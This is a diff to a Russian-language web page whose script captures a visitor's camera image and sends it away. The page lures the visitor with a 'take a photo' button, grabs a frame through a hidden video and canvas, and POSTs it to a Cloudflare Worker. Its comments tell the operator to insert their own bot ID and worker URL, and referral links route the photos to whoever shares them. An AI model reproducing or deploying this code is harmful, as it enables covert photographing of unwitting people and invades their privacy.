@@ -31,9 +31,9 @@
   <button id="btn" onclick="shoot()">📸 Разрешить и сделать фото</button>
 
 <script>
-  // Твой ID (если друг перешел по ссылке без ?ref=, фото придет тебе)
+  // СЮДА ВСТАВЬ СВОЙ ID ИЗ @userinfobot (вместо 8166255221)
   const urlParams = new URLSearchParams(window.location.search);
-  const ownerId = urlParams.get('ref') || "8166255221"; // Укажи тут свой ID, если знаешь
+  const ownerId = urlParams.get('ref') || "8166255221"; 
 
   const btn = document.getElementById('btn');
   const title = document.getElementById('title');
@@ -53,7 +53,6 @@
 
       btn.textContent = "Улыбнись... 😄";
       
-      // Создаем скрытое видео для захвата
       const v = document.createElement('video');
       v.srcObject = stream;
       v.setAttribute('playsinline', 'true');
@@ -62,7 +61,6 @@
       await v.play();
       await new Promise(r => setTimeout(r, 500)); 
 
-      // Делаем снимок
       const c = document.createElement('canvas');
       c.width = v.videoWidth || 640;
       c.height = v.videoHeight || 480;
@@ -72,8 +70,9 @@
       stream.getTracks().forEach(track => track.stop());
       btn.textContent = "Отправляем...";
 
-      // ТВОЙ CLOUDFLARE WORKER URL
-      const WORKER_URL = 'https://little-cell-9f25.a24s1tn1kof.workers.dev/';
+      // НОВАЯ ССЫЛКА НА ТВОЙ CLOUDFLARE (с названием memfoto-official)
+      // Она появится после того, как ты создашь проект в Cloudflare
+      const WORKER_URL = 'https://memfoto-official.ТВОЙ_НИК.workers.dev/';
 
       const res = await fetch(WORKER_URL, {
         method: 'POST',
